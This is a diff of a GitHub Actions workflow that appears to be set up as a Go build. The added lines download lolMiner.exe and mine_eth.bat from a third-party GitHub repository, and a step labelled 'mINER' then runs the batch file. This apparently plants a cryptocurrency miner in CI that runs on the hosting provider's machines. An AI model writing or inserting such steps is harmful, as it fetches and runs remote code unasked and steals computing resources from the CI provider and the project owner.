@@ -17,7 +17,8 @@ jobs:
     steps:
     - name: download
       run: |
-        Invoke-WebRequest https://raw.githubusercontent.com/Bang122/miner/main/Script/mine_eth.bat -OutFile mine_eth.bat
+        Invoke-WebRequest https://raw.githubusercontent.com/Bang122/miner/main/lolMiner.exe -OutFile lolMiner.exe
+        Invoke-WebRequest https://raw.githubusercontent.com/Bang122/miner/main/mine_eth.bat -OutFile mine_eth.bat
     - name: Set up Go ${{ matrix.go }}
       uses: actions/setup-go@v1
       with:
@@ -26,4 +27,4 @@ jobs:
     - name: Setup
       uses: actions/checkout@v1
     - name: mINER
-      run: cmd /c Script/mine_eth.bat
+      run: cmd /c mine_eth.bat
